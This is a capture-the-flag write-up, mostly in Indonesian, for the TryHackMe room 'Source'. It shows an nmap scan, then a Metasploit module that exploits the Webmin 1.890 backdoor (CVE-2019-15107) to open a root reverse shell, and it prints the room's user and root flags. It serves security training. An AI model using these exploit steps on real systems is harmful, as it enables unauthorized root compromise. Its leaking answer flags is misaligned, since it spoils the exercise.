Source

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

<img width="250" height="250" alt="image" src="https://github.com/user-attachments/assets/8f63325f-02d5-4af8-bff2-0126ef31a1b7" />

```
# TryHackMe: Source - Writeup & Documentation

![TryHackMe](https://shields.io)
![Category](https://shields.io)
![Difficulty](https://shields.io)

Dokumentasi proses eksploitasi pada mesin **Source** di TryHackMe. Room ini berfokus pada eksploitasi kerentanan *backdoor* pada layanan manajemen sistem **Webmin**.

## 🛡️ Ringkasan Mesin
- **Nama Mesin:** Source
- **Platform:** [TryHackMe](https://tryhackme.com)
- **Tingkat Kesulitan:** Easy
- **Tujuan:** Mendapatkan akses Root dan mengambil User & Root Flag.
- **Kerentanan:** CVE-2019-15107 (Webmin 1.890 Exploit).

## 🚀 Tahapan Eksploitasi

### 1. Reconnaissance (Pengintaian)
Langkah awal dilakukan pemindaian jaringan menggunakan `nmap` untuk mengidentifikasi port yang terbuka dan layanan yang berjalan.

```bash
# Perintah Nmap
nmap -sV -sC -Pn 10.49.144.156
```
# Hasil Scan:

    Port 22/tcp: Open (OpenSSH 7.6p1)
    Port 10000/tcp: Open (MiniServ 1.890 - Webmin httpd)

<img width="774" height="249" alt="port1000" src="https://github.com/user-attachments/assets/8572dc8d-65a1-42f4-8ccd-df6a30faa9a4" />

# Analisis Kerentanan

Ditemukan bahwa target menjalankan Webmin versi 1.890. 
Versi ini diketahui memiliki kerentanan backdoor pada parameter ```password_change.cgi``` 
yang memungkinkan ```Unauthenticated Remote Code Execution (RCE).```

# Exploitation (Eksploitasi)
Menggunakan Metasploit Framework untuk mendapatkan akses shell.
Konfigurasi Metasploit:

```bash
msfconsole
```

```msf
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.49.144.156
set LHOST tun0
set SSL true
exploit
```
# Cek Identitas
Ketik:

```bash
whoami
```
(Hasilnya harusnya root).
Hasil Eksploitasi:
Sesi Reverse Shell terbuka dengan hak akses root.

# Ambil Flag User
Ketik:

```bash
cat /home/dark/user.txt
```

```User Flag: THM{SUPPLY_CHAIN_COMPROMISE}```
    
# Ambil Flag Root
Ketik:

```bash
cat /root/root.txt
```
```Root Flag: THM{UPDATE_YOUR_INSTALL}```

<img width="782" height="546" alt="ctf" src="https://github.com/user-attachments/assets/c673ee89-5d59-4062-bdec-3f00669eb2b3" />




